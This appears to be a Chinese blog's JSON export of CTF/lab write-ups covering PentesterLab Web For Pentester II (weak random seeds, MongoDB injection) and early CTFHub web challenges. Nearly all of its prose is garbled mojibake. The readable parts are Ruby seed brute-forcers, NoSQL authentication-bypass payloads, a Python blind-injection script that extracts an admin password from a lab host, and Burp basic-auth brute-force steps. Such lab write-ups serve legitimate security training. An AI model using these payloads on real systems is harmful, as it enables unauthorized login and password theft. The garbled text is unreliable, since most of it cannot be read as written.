ã€‚ç›å€¼ï¼ˆ`SEED` åœ¨è¿™é‡Œå°±æ˜¯ä¸€ç§ç›å€¼ï¼‰æ˜¯ä¸€ä¸ªé¢å¤–çš„éšæœºå­—ç¬¦ä¸²ï¼Œé€šè¿‡ä¸ç”¨æˆ·å¯†ç ç»“åˆï¼Œå¢åŠ äº†å“ˆå¸Œçš„éšæœºæ€§å’Œå®‰å…¨æ€§ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒMD5 å·²ç»ä¸å†è¢«è®¤ä¸ºæ˜¯è¶³å¤Ÿå®‰å…¨çš„å“ˆå¸Œç®—æ³•ï¼Œå› ä¸ºå®ƒå®¹æ˜“å—åˆ°ç¢°æ’æ”»å‡»ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæ¨èä½¿ç”¨æ›´å¼ºå¤§å’Œå®‰å…¨çš„å“ˆå¸Œç®—æ³•ï¼Œå¦‚ SHA-256 æˆ– SHA-3ï¼Œå¹¶ä¸”ç»“åˆè¶³å¤Ÿé•¿ã€éšæœºçš„ç›å€¼æ¥å­˜å‚¨ç”¨æˆ·å¯†ç ã€‚ é‚£æˆ‘ä»¬æ‰¾ä¸€ä¸ªRubyçš„åœ¨çº¿è¿è¡Œå·¥å…·è¿è¡Œä¸€ä¸‹å³å¯ å¦‚ä¸Šå›¾ï¼Œå¤šæ¬¡å°è¯•ä½ ä¼šå‘ç°ï¼Œå³ä¾§ç»“æœä¸ä¼šæ”¹å˜ï¼Œé‚£adminçš„å¯†ç å°±æ˜¯ç¬¬ä¸€ä¸ªäº†ï¼Œå¦‚ä¸‹å›¾success Example 2 åœ¨è¿™é‡Œå‘¢ä¸ä¸Šä¸€å…³ç›¸ä¼¼ï¼Œåªä¸è¿‡éšæœºæ•°ç§å­æ¢ä¸ºäº†å½“å‰æ—¶é—´æˆ³ã€‚è¿™ä»¤æˆ‘å¤´ç–¼ï¼Œæˆ‘ä»¥ä¸ºé¡µé¢ä¼šåœ¨æŸå¤„æ³„éœ²ä¸€ä¸‹æ—¶é—´çš„ï¼Œä½†æˆ‘æ‰¾ä¸åˆ°ï¼Œé‚£çœ‹ä¸€ä¸‹å®˜æ–¹è¯´æ˜å§ æ­¤ç¤ºä¾‹æ˜¾ç¤ºäº†éšæœºç”Ÿæˆå™¨æ’­ç§ä¸è‰¯çš„å¦ä¸€ä¸ªç¤ºä¾‹ã€‚éšæœºç”Ÿæˆå™¨ä»¥å½“å‰æ—¶é—´ä¸ºç§å­ã€‚ è¦è·å– admin å¯†ç ï¼Œæ‚¨éœ€è¦æš´åŠ›ç ´è§£ç§å­ã€‚ä¸ºæ­¤ï¼Œæ‚¨å¯ä»¥ä»å½“å‰æ—¶é—´å¼€å§‹å¹¶å‡å°‘æ—¶é—´ï¼ŒåŒæ—¶é‡æ–°æ‰§è¡Œç”¨äºç”Ÿæˆå€¼çš„ç®—æ³•ï¼Œç›´åˆ°è·å¾—å¯†ç ã€‚ ä¸€æ—¦è·å¾—å¯†ç ï¼Œæ‚¨å°±çŸ¥é“ä½¿ç”¨äº†ä»€ä¹ˆç§å­ï¼ˆæˆ–è€…æ›´å‡†ç¡®åœ°è¯´ï¼Œéšæœºç”Ÿæˆå™¨åˆå§‹åŒ–çš„æ—¶é—´ï¼‰ã€‚ç„¶åæ‚¨å¯ä»¥è·å¾— admin å¯†ç ã€‚ åŸæ¥å¦‚æ­¤ï¼Œå­¦åˆ°äº†ï¼Œä¸è¿‡æˆ‘è¿™éƒ½2023å¹´äº†ï¼Œçˆ†ç ´ä¼°è®¡å¾ˆè´¹äº‹ï¼Œè¿™é‡Œå…ˆè´´ä¸Šå¤§ä½¬çš„è„šæœ¬è®©ä»–è‡ªå·±å…ˆå»çˆ†ç ´å§ timestamp = (Time.now.to_f).to_i seed = Random.new(timestamp) pass_admin = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.join pass_hacker = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.join while pass_hacker !=\"efefsk\" do #contraseÃ±a del usuario 'hacker' timestamp = timestamp - 1 seed = Random.new(timestamp) pass_admin = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.join pass_hacker = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.join end puts \"Password de admin: \" puts pass_admin æœ€ç»ˆä¹Ÿæ˜¯æˆåŠŸçˆ†ç ´å‡ºæ¥ Example 3 è¿™é‡Œçœ‹åˆ°sæ¢å¤äº†ä»¥0ä½éšæœºæ•°ç§å­ï¼Œä½†ç”Ÿæˆå¯†ç çš„æ—¶å€™å‡ºç°äº†6+s.rand(5)è¿™ä¼¼ä¹æ˜¯éšæœºå¢åŠ äº†å¯†ç çš„ä½æ•°ï¼Œè¿™ä¼¼ä¹å¢åŠ äº†çˆ†ç ´éš¾åº¦ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å®˜æ–¹è¯´æ˜ è¿™ä¸ªä¾‹å­éå¸¸ç®€å•å¹¶ä¸”ä¸ç¬¬ä¸€ä¸ªä¾‹å­ç±»ä¼¼ã€‚æ‚¨åªéœ€é‡æ’­ä»£ç å³å¯è·å– admin å¯†ç ã€‚å¯†ç é•¿åº¦æ˜¯éšæœºçš„è¿™ä¸€äº‹å®å¹¶ä¸å½±å“æ‚¨å¯ä»¥çŒœæµ‹å®ƒã€‚ å°´å°¬ï¼ŒåŸæ¥å¦‚æ­¤ç®€å•ï¼Œå¦‚ä¸‹å›¾æˆåŠŸçˆ†ç ´ Example 4 è¿™ä¸€å…³å¤šäº†ä¸€æ¡ä»£ç ï¼Œæˆ‘ä»¬çœ‹çœ‹GPTå¦‚ä½•è§£é‡Šï¼š è¿™æ®µ Ruby ä»£ç çš„ç›®çš„æ˜¯ä½¿ç”¨ `Random.new(0)` åˆ›å»ºä¸€ä¸ªä¼ªéšæœºæ•°ç”Ÿæˆå™¨å¯¹è±¡ï¼Œå¹¶åœ¨è¯¥å¯¹è±¡ä¸Šè¿›è¡Œéšæœºæ•°çš„ç”Ÿæˆæ“ä½œã€‚ä»¥ä¸‹æ˜¯å¯¹ä»£ç çš„è¯¦ç»†è§£é‡Šï¼š 1. `s = Random.new(0)`: åˆ›å»ºä¸€ä¸ªæ–°çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨ç§å­å€¼ `0` è¿›è¡Œåˆå§‹åŒ–ã€‚è¿™ä¸ªå¯¹è±¡å°†ç”¨äºç”Ÿæˆéšæœºæ•°åºåˆ—ã€‚ 2. `rand(1000).times {s.rand(5)}`: - `rand(1000)`: ç”Ÿæˆä¸€ä¸ªä»‹äº 0 å’Œ 999 ä¹‹é—´çš„éšæœºæ•´æ•°ã€‚`rand` æ–¹æ³•ç”¨äºç”Ÿæˆä¼ªéšæœºæ•°ï¼Œé»˜è®¤èŒƒå›´æ˜¯ [0, 1)ï¼Œé€šè¿‡ä¼ é€’å‚æ•°å¯ä»¥æŒ‡å®šèŒƒå›´ã€‚ - `.times {s.rand(5)}`: é’ˆå¯¹ç”Ÿæˆçš„æ•´æ•°å€¼æ‰§è¡Œä»£ç å—ï¼Œè¯¥ä»£ç å—ä¸­ä½¿ç”¨ `s.rand(5)` ç”Ÿæˆ 0 åˆ° 4 ä¹‹é—´çš„éšæœºæ•´æ•°ï¼Œå®é™…ä¸Šå¹¶æ²¡æœ‰å¯¹è¿™äº›ç”Ÿæˆçš„éšæœºæ•°è¿›è¡Œè¿›ä¸€æ­¥çš„æ“ä½œã€‚ æ€»çš„æ¥è¯´ï¼Œè¿™æ®µä»£ç åˆ›å»ºäº†ä¸€ä¸ªä¼ªéšæœºæ•°ç”Ÿæˆå™¨å¯¹è±¡ `s`ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªä»‹äº 0 å’Œ 999 ä¹‹é—´çš„éšæœºæ•´æ•°ï¼Œæ¥ç€å¯¹è¯¥æ•´æ•°è¿›è¡Œå¾ªç¯ï¼ˆ`rand(1000).times`ï¼‰ï¼Œåœ¨æ¯æ¬¡å¾ªç¯ä¸­ç”Ÿæˆ 0 åˆ° 4 ä¹‹é—´çš„éšæœºæ•´æ•°ã€‚åœ¨è¿™é‡Œï¼Œå¾ªç¯çš„ç›®çš„ä¼¼ä¹åªæ˜¯ä¸ºäº†äº§ç”Ÿä¸€ç³»åˆ—éšæœºæ•°è€Œæ²¡æœ‰ç›´æ¥ä½¿ç”¨å®ƒä»¬ã€‚ è¿™é‡Œçœ‹çš„è§£é‡Šè¿˜æ˜¯æœ‰ç‚¹æ‡µï¼Œæˆ‘ä»¬çœ‹çœ‹å®˜æ–¹å¦‚ä½•è¯´ï¼š åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ‚¨ä¸çŸ¥é“åœ¨ç”Ÿæˆå¯†ç ä¹‹å‰ä½¿ç”¨äº†å¤šå°‘æ¬¡éšæœºç”Ÿæˆå™¨ï¼ˆå› ä¸ºå®ƒæ˜¯å¯¹ rand(1000) çš„è°ƒç”¨ï¼Œè€Œä¸æ˜¯ s.rand(1000) ã€‚æ‚¨ä»ç„¶å¯ä»¥è·å¾—ä¹‹å‰ç”Ÿæˆçš„å¯†ç ã€‚è¦è·å–å®ƒï¼Œæ‚¨åªéœ€æš´åŠ›ç ´è§£è¯¥å€¼ï¼Œç›´åˆ°è·å¾—å¯†ç ã€‚ è¿™é‡Œä¼¼ä¹å°±ç†è§£äº†ï¼Œä¸Šè¿°rand(1000).times {s.rand(5)}çš„ä½œç”¨ä¼¼ä¹æ˜¯ä»¤s = Random.new(0)æ‰§è¡Œrand(1000).timesæ¬¡ï¼Œä½†è¿™é‡Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“åœ¨æ­¤ä¹‹å‰s = Random.new(0)æ‰§è¡Œè¿‡å‡ æ¬¡ï¼Œä½†æˆ‘ä»¬ä»ç„¶æ˜¯å¯ä»¥è¿›è¡Œæš´åŠ›ç ´è§£æ¥è·å–å¯†ç çš„ï¼Œåªéœ€è¦é‡å¤æ‰§è¡Œé¢˜ç›®ç»™æˆ‘ä»¬çš„æºç å³å¯ï¼Œè®©æˆ‘ä»¬æ ¹æ®Example 2çš„è„šæœ¬è¿›è¡Œç®€å•ä¿®æ”¹å³å¯ s = Random.new(0) rand(1000).times {s.rand(5)} pass_admin = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.join pass_hacker = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.join while pass_hacker != \"udxpnv\" do s = Random.new(0) rand(1000).times {s.rand(5)} pass_admin = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.join pass_hacker = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.join end puts \"Password de admin: \" puts pass_admin æœ€ç»ˆä¹Ÿæ˜¯æˆåŠŸçˆ†å‡º æˆåŠŸç™»å½• 0x08 MongoDB æ³¨å…¥ å®˜æ–¹è¯´æ˜ï¼š å³ä½¿ MongoDB æ˜¯ NoSQL æ•°æ®åº“ï¼Œä»ç„¶æœ‰å¯èƒ½ç¼–å†™æ˜“å—æ”»å‡»çš„ä»£ç ï¼Œå› æ­¤æœ¬ç»ƒä¹ å…·æœ‰ä¸¤ä¸ª NoSQL æ³¨å…¥ã€‚ å¦‚æœæ‚¨æƒ³è‡ªå·±å°è¯•ï¼Œè¯·å°è¯•æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š å­¦ä¹ å¹¶ç†è§£ MongoDB è¯­æ³•æ˜¯ä»€ä¹ˆæ ·çš„ï¼ˆæ‰¾åˆ°é¡¹ç›®çš„ç½‘ç«™å¹¶é˜…è¯»æ–‡æ¡£ï¼‰ã€‚ æŸ¥æ‰¾å¯ç”¨äºåˆ é™¤æ³¨å…¥ç‚¹ä¹‹åçš„ä»£ç çš„å†…å®¹ï¼ˆæ³¨é‡Šã€ç©ºå­—èŠ‚ï¼‰ã€‚ äº†è§£å¦‚ä½•ç”Ÿæˆå§‹ç»ˆ true æ¡ä»¶ï¼ˆä¾‹å¦‚ 1ï¼‰ã€‚ äº†è§£å¦‚ä½•æ£€ç´¢ä¿¡æ¯ï¼ˆä¾‹å¦‚ 2ï¼‰ã€‚ ä¸å‡ ä¹æ”¯æŒç›¸åŒè¯­æ³•çš„ SQL æ•°æ®åº“ç›¸åï¼ŒNoSQL æ•°æ®åº“å…·æœ‰ä¸åŒçš„è¯­æ³•ã€‚ Example 1 ä¸€ä¸ªç†Ÿæ‚‰çš„ç™»å½•æ¡†ï¼Œè¿™é‡Œæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°åœ¨hackeråé¢æ·»åŠ å•å¼•å·ä¼šæŠ¥é”™ï¼Œä½†æŠ¥é”™å‡ºæ¥çš„ä¸œè¥¿ä¼¼ä¹ä¹Ÿæ²¡ä»€ä¹ˆä¿¡æ¯ï¼Œè¿™é‡Œè¿˜æ˜¯çœ‹äº†ç­”æ¡ˆæ‰çŸ¥é“å¦‚ä½•åšçš„ã€‚ ä½†å®˜æ–¹æç¤ºæˆ‘ä»¬ï¼šäº†è§£å¦‚ä½•ç”Ÿæˆå§‹ç»ˆ true æ¡ä»¶ï¼ˆä¾‹å¦‚ 1ï¼‰ã€‚é‚£ä¾‹å­1å°±æ˜¯è€ƒå¯Ÿä¸‡èƒ½å¯†ç ç»•è¿‡ï¼Œæˆ–è€…å«nosqlæ°¸çœŸå¼æ³¨å…¥ï¼Œä½†æˆ‘ç¿»äº†ç¿»ç¬”è®°ï¼Œå‘ç°ä¸è¿™ä¸€å…³çš„é€šå…³æŠ€å·§è¿˜ä¸ä¸€æ ·ï¼Œå…ˆå±•ç¤ºä¸€ä¸‹å®˜æ–¹æ‰‹æ³•ï¼š è¿™ä¸ªä¾‹å­æ˜¯è‘—åçš„ ' or 1=1 -- çš„ MongoDB ç‰ˆæœ¬ã€‚å¦‚æœæ‚¨è¿˜è®°å¾—ä¹‹å‰çœ‹åˆ°çš„å†…å®¹ï¼Œæ‚¨å°±ä¼šçŸ¥é“éœ€è¦åšä¸¤ä»¶äº‹æ‰èƒ½ç»•è¿‡æ­¤ç™»å½•ï¼š å§‹ç»ˆçœŸå®çš„æ¡ä»¶ã€‚ ä¸€ç§æ­£ç¡®ç»ˆæ­¢ NoSQL æŸ¥è¯¢çš„æ–¹æ³•ã€‚ é¦–å…ˆï¼Œé€šè¿‡é˜…è¯» MongoDB æ–‡æ¡£ï¼Œæ‚¨å¯ä»¥å‘ç° SQL or 1=1 è½¬æ¢ä¸º || 1==1 ï¼ˆæ³¨æ„åŒ = ï¼‰ã€‚ç„¶åé€šè¿‡æŸ¥çœ‹ï¼Œæ‚¨å¯ä»¥çœ‹åˆ° NULL BYTE å°†é˜»æ­¢ MongoDB ä½¿ç”¨æŸ¥è¯¢çš„å…¶ä½™éƒ¨åˆ†ã€‚æ‚¨è¿˜å¯ä»¥ä½¿ç”¨æ³¨é‡Š // æˆ– &lt;!-- æ³¨é‡Šæ‰æŸ¥è¯¢çš„æœ«å°¾ã€‚ æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæ‚¨åº”è¯¥èƒ½å¤Ÿç»•è¿‡èº«ä»½éªŒè¯è¡¨å•ã€‚ ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å°†usernameèµ‹å€¼ä¸ºhacker' || 1==1//æˆ–è€…hacker' || 1==1&lt;!--æˆ–è€…hacker' || 1// Example 2 è¿™ä¸€å…³æ˜¯è®©æˆ‘ä»¬äº†è§£å¦‚ä½•æ£€ç´¢ä¿¡æ¯ ä½†æˆ‘ä¹Ÿä¸æ¸…æ¥šåå°è¯­å¥ï¼Œæœ‰ç‚¹è’™è”½çš„ï¼Œçœ‹äº†ç­”æ¡ˆå‘ç°æœ‰ç‚¹éš¾å•Šï¼Œè¿™äº›è¯­å¥éƒ½æ²¡å’‹è§è¿‡ã€‚ã€‚ã€‚è¿™é‡Œå°±è·Ÿç€wpèµ°äº† åœ¨ç¬¬äºŒä¸ªä¹Ÿæ˜¯æœ€åä¸€ä¸ªç»ƒä¹ ä¸­ï¼Œæˆ‘ä»¬å¿…é¡»é€šè¿‡æ“ä½œ GET è¯·æ±‚æ¥è·å–ç®¡ç†å‘˜å¯†ç ã€‚ ä½¿ç”¨ä»¥ä¸‹ URLï¼Œæ— è®ºå¯†ç å¦‚ä½•ï¼Œéƒ½ä¼šæ˜¾ç¤ºåä¸ºâ€œadminâ€çš„ç”¨æˆ·ï¼š ?search=admin' &amp;&amp; this.password.match(/./) ç°åœ¨ï¼Œå¦‚æœæˆ‘ä»¬æ›´æ”¹â€œ/ /â€ä¹‹é—´çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥â€œçŒœæµ‹â€å¯†ç å­—ç¬¦ï¼Œå› ä¸ºå¦‚æœè¯¥å­—ç¬¦åœ¨å¯†ç ä¸­ï¼Œåˆ™å°†æ˜¾ç¤ºç®¡ç†ä¿¡æ¯ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™ä¸ä¼šæ¢å¤ä»»ä½•å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š ?search=admin' &amp;&amp; this.password.match(/k/) è¯´ç™½äº†è¿™é‡Œå°±æ˜¯æ ¹æ®é¡µé¢å›æ˜¾æƒ…å†µï¼Œåˆ¤æ–­å‡ºéœ€è¦åˆ©ç”¨ç›²æ³¨çš„æ‰‹æ®µï¼Œä¸è¿‡è¿™é‡Œçš„æ­£åˆ™åŒ¹é…æ²¡è§è¿‡ã€‚ã€‚ã€‚ã€‚çœŸä¸çŸ¥é“è¿™æ˜¯ä»€ä¹ˆè¯­è¨€å†™çš„ï¼Œä¸‹å»æœ‰æ—¶é—´å¾—å¥½å¥½å¤ä¹ äº† ä¸è¿‡è¿™é‡Œçš„payloadä¼¼ä¹éœ€è¦urlç¼–ç ä¸€ä¸‹ &amp;&amp; ç¼–ç ä¸º%26%26 å…¶ä¸­æœ€åçš„// ç±»ä¼¼äºsqlä¸­çš„â€“-å³æ³¨é‡Šä½œç”¨ã€‚è€Œ%00 ç©ºå­—ç¬¦ä¹Ÿå¯ä»¥é˜»æ­¢åè¾¹çš„æ‰§è¡Œã€‚ è¿˜å¯ä»¥åŠ ä¸Šæ­£åˆ™ä¸­çš„ ^ $ åˆ†åˆ«é™å®šã€‚ å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›ç»“æœï¼Œå¦‚æœfalseï¼Œåˆ™æ— ç»“æœè¿”å›ã€‚ è„šæœ¬å¦‚ä¸‹ï¼š é‚£æ¯«æ— ç–‘é—®å¾—å†™è„šæœ¬äº†ï¼Œç»§ç»­å‘ä½¬ä»¬å­¦ä¹ å†™è„šæœ¬ï¼Œçœ‹äº†çœ‹å‘ç°é€»è¾‘å¾ˆç®€å•ï¼Œè¯•ç€ç¼–å†™ä¸€ä¸‹ import requests import string strs = string.ascii_letters + string.digits url = 'http://192.168.246.135/mongodb/example2/?search=admin%27%26%26this.password.match(/^{}$/)//+%00' passwords = \"\" while True: for c in strs: tmp = passwords + c html = requests.get(url.format(tmp +'.*')) if \"admin\" in html.text: passwords += c print(\"Find a key:{}\".format(passwords)) break æœ€ç»ˆçˆ†å‡ºå¯†ç å¦‚ä¸‹ï¼š è¿™é‡Œé™„ä¸ŠGPTå¯¹ä¸Šè¿°æ­£åˆ™çš„è§£é‡Šï¼ˆè¿™é‡Œä¸å¿…åœ¨ä¹ä»–å¯¹{}çš„è§£é‡Šï¼‰ æ­£åˆ™è¡¨è¾¾å¼ `this.password.match(/^{}.*$/)` åœ¨åŒ¹é…å­—ç¬¦ä¸²æ—¶æœ‰ä¸€äº›é—®é¢˜ã€‚é¦–å…ˆï¼Œ`{}` æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œè¡¨ç¤ºä¸€ä¸ªç©ºçš„é‡è¯ï¼ˆquantifierï¼‰ï¼Œç”¨äºæŒ‡å®šå‰é¢çš„å­—ç¬¦æˆ–å­è¡¨è¾¾å¼çš„é‡å¤æ¬¡æ•°ã€‚å¦‚æœä½ æƒ³åŒ¹é…å­—ç¬¦ä¸²ä¸­åŒ…å«çš„å®é™…çš„ `{}` å­—ç¬¦ï¼Œä½ éœ€è¦å¯¹å…¶è¿›è¡Œè½¬ä¹‰ï¼Œå³å†™æˆ `\\{\\}`ã€‚ ç„¶åï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„å…·ä½“å«ä¹‰æ˜¯ï¼š - `^`: åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´ã€‚ - `\\{\\}`: åŒ¹é…å®é™…çš„ `{}` å­—ç¬¦ã€‚ - `.*`: åŒ¹é…ä»»æ„æ•°é‡çš„ä»»æ„å­—ç¬¦ï¼ˆé™¤äº†æ¢è¡Œç¬¦ï¼‰ï¼Œ`.*` è¡¨ç¤ºé›¶ä¸ªæˆ–å¤šä¸ªä»»æ„å­—ç¬¦ã€‚ - `$`: åŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚ å› æ­¤ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€æ˜¯åŒ¹é…ä»¥ `{}` å¼€å¤´ï¼Œå¹¶ä¸”åé¢å¯ä»¥æœ‰ä»»æ„å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚ å¦‚æœä½ æƒ³è¦åŒ¹é…åŒ…å« `{}` çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸” `{}` ä¹‹é—´è‡³å°‘æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ï¼Œä½ å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ `\\{\\}.*\\{\\}`ã€‚è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„å«ä¹‰æ˜¯åŒ¹é…ä»¥ `{}` å¼€å¤´ï¼Œå¹¶ä¸”åé¢è‡³å°‘æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ï¼Œç„¶åå†è·Ÿç€ `{}`ï¼Œå³ `{}` ä¹‹é—´è‡³å°‘æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚ æ‰€ä»¥è¿™é‡Œçš„.*ä¸^å’Œ$é…åˆï¼Œæ˜¯ä¸ºäº†ä¿è¯æˆ‘ä»¬ä»å¯†ç çš„ç¬¬ä¸€ä½å­—ç¬¦å¼€å§‹åŒ¹é…è‡³æœ€åä¸€ä½ï¼Œè€Œä¸ä¼šé€ æˆåŒ¹é…å¯†ç çš„ä¸­é—´æŸäº›å­—ç¬¦çš„æƒ…å†µå‡ºç° 0x09 åè¨€ è¿™ä¸ªç»ƒä¹ ä¹Ÿæ˜¯æ”¶è·è‰¯å¤šï¼Œä½†åŒæ—¶è®©æˆ‘æ˜ç™½äº†æˆ‘ä¹‹å‰çš„å­¦çš„webåŸºç¡€æ¼æ´çŸ¥è¯†ä»ç„¶æœ‰æ‰€æ¬ ç¼ºï¼Œæ—¥åä¼šåšæŒåˆ·ä¸€äº›webé¶åœºï¼Œä»¥åŠçº¢é˜Ÿé¶åœºï¼Œåªèƒ½è¯´æ„Ÿè§‰æ—¶é—´å¥½ç´§å¼ ï¼Œç›®å‰çš„æˆ‘ä»ç„¶è®¤ä¸ºè‡ªå·±æŒæ¡çš„å°±æ˜¯ä¸€å¨ç­”è¾©ï¼ŒçœŸçš„å¾ˆç³Ÿå¿ƒã€‚å¯¹æ­¤å…ˆä¸åæ§½äº†ï¼Œè¿˜æ˜¯æŠ“ç´§æ—¶é—´å­¦ä¹ å§~~ï¼Œä¹‹åå†æŠŠè¿™ä¸ªé¶åœºçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬åˆ·ä¸€ä¸‹ï¼Œå°±æ­£å¼å®Œç»“äº†ã€‚ 0x10 å‚è€ƒæ–‡ç«  CTFé¶åœºç³»åˆ—-Pentester Lab: Web For Pentester II web_for_pentest_II writeup å®˜æ–¹è§£é‡Š ã€æŠ€æœ¯åˆ†äº«ã€‘Web for Pentester IIç»ƒä¹ é¢˜è§£ [Pentesterlab write-up] Web For Pentester II - Randomness Issues &amp; MongoDB injection nosqlå‚è€ƒï¼šNosql æ³¨å…¥ä»é›¶åˆ°ä¸€ --æ„Ÿè§‰æŒºä¸é”™ï¼Œæ—¥åæœ‰æœºä¼šåœ¨å¥½å¥½å­¦å­¦","tags":["webæ¸—é€"],"categories":["PentesterLabç³»åˆ—"]},{"title":"CTFHubç³»åˆ—","path":"/2023/12/12/ctfhub-xi-lie/","content":"0x00 Web Webå‰ç½®æŠ€èƒ½ HTTPåè®®-è¯·æ±‚æ–¹å¼ é¢˜ç›®æè¿°ï¼šHTTP è¯·æ±‚æ–¹æ³•, HTTP/1.1åè®®ä¸­å…±å®šä¹‰äº†å…«ç§æ–¹æ³•ï¼ˆä¹Ÿå«åŠ¨ä½œï¼‰æ¥ä»¥ä¸åŒæ–¹å¼æ“ä½œæŒ‡å®šçš„èµ„æºã€‚ æç¤º:å¦‚æœä½ å¾—åˆ°â€œHTTPæ–¹æ³•ä¸å…è®¸â€é”™è¯¯ï¼Œä½ åº”è¯¥è¯·æ±‚index.phpã€‚ è¿™é‡Œä¸çŸ¥é“è¯·æ±‚çš„å«ä¹‰ï¼Œè¿˜æ˜¯çœ‹äº†wpæ‰æ˜ç™½çš„ã€‚ã€‚ã€‚å…ˆè¯´ç»“æœï¼Œè¿™é‡Œè¯´æ˜¯httpè¯·æ±‚æ–¹æ³•æ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ï¼Œé‚£é¢˜ç›®è®©æˆ‘ä»¬ä½¿ç”¨CTFHUBæ–¹æ³•æ¥è¯·æ±‚index.phpé¡µé¢ï¼Œè¿™é‡Œæˆ‘å…ˆç”¨bpæŠ“åŒ…ä¿®æ”¹äº† å¦‚å›¾æ‹¿åˆ°flagï¼Œä¸è¿‡wpæ˜¯é€šè¿‡curlçš„æ–¹æ³•æ¥è¯·æ±‚çš„ curl -v -X CTFHUB http://challenge-c76d77da5e3e2f67.sandbox.ctfhub.com:10800/index.php HTTPåè®®-302è·³è½¬ ä¸€ä¸ªè¶…é“¾æ¥ï¼Œç‚¹å‡»ä¸€ä¸‹çœ‹æºä»£ç  å‘ç°æ˜¯è¦è·³è½¬åˆ°index.phpé¡µé¢çš„ï¼Œä½†æˆ‘ä»¬å®é™…ä¸Šæ˜¯è·³è½¬åˆ°äº†index.htmlï¼Œè¿™é‡Œå°±æ˜¯è¢«é‡å®šå‘äº†ï¼Œbpæˆªä¸€æ‰‹ æˆåŠŸæ‹¿åˆ°ï¼Œå½“ç„¶è¿™é‡Œä¾æ—§å¯ä»¥ç”¨curlå‘½ä»¤æ¥è®¿é—®index.php HTTPåè®®-Cookie è¿™é‡Œè¯´åªæœ‰adminç”¨æˆ·èƒ½æ‹¿åˆ°flagï¼Œæˆ‘ä»¬éœ€è¦ä¼ªé€ cookie bpæŠ“åŒ…å‘ç°admin=0ï¼Œç›´è§‰æ”¹ä¸º1å³å¯ æ‹¿åˆ°flag HTTPåè®®-åŸºç¡€è®¤è¯ è¿™é‡Œæˆ‘ä»¬ç‚¹å‡»ä¹‹åéœ€è¦è¾“å…¥è´¦æˆ·å¯†ç  å¦‚ä¸Šå›¾è¾“å…¥ä¹‹åbpæŠ“åŒ…çœ‹çœ‹ è¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦çˆ†ç ´äº† è¿™é‡Œè¿˜æç¤ºæˆ‘ä»¬ä½ çŸ¥é“adminå—ï¼Œé‚£è¯´æ˜ç”¨æˆ·åå¤§æ¦‚ç‡å°±æ˜¯adminäº† å‘é€åˆ°bpçš„çˆ†ç ´æ¨¡å—å¼€å§‹çˆ†ç ´ Payload Processing -&gt; Add-&gt; Add Prefixï¼ˆæ·»åŠ å‰ç¼€ï¼‰-&gt; è¾“å…¥ admin: Payload Processing -&gt; Add-&gt; Encodeï¼ˆæ·»åŠ ä¸€ä¸ªç¼–ç æ–¹å¼ï¼‰-&gt; é€‰æ‹© Base64 Encode Payload Encode å–æ¶ˆå‹¾é€‰ URL-encode, ä¸ç„¶ä½ ä¼šçœ‹åˆ° base64 ä¹‹åçš„ = ä¼šè¢«è½¬æˆ %3d ï¼Œä½ å°±ç®—çˆ†ç ´åˆ°å¤©è’åœ°è€ä¹Ÿä¸ä¼šå‡ºæ¥ æ‰¾åˆ°flag è¿™é‡Œäº†è§£ä¸€ä¸‹HTTPåŸºç¡€è®¤è¯ï¼š åœ¨HTTPä¸­ï¼ŒåŸºæœ¬è®¤è¯ï¼ˆè‹±è¯­ï¼šBasic access authenticationï¼‰æ˜¯å…è®¸httpç”¨æˆ·ä»£ç†ï¼ˆå¦‚ï¼šç½‘é¡µæµè§ˆå™¨ï¼‰åœ¨è¯·æ±‚æ—¶ï¼Œæä¾› ç”¨æˆ·å å’Œ å¯†ç  çš„ä¸€ç§æ–¹å¼ã€‚ HTTP-å“åº”åŒ…æºä»£ç  ç›´æ¥å³é”®æºä»£ç æŸ¥çœ‹å¾—åˆ° ä¿¡æ¯æ³„éœ² ç›®å½•éå† æ ¹æ®é¢˜ç›®æç¤ºç›´æ¥ç‚¹å‡»ç›®å½•æ‰¾å³å¯ PHPINFO phpinfo() 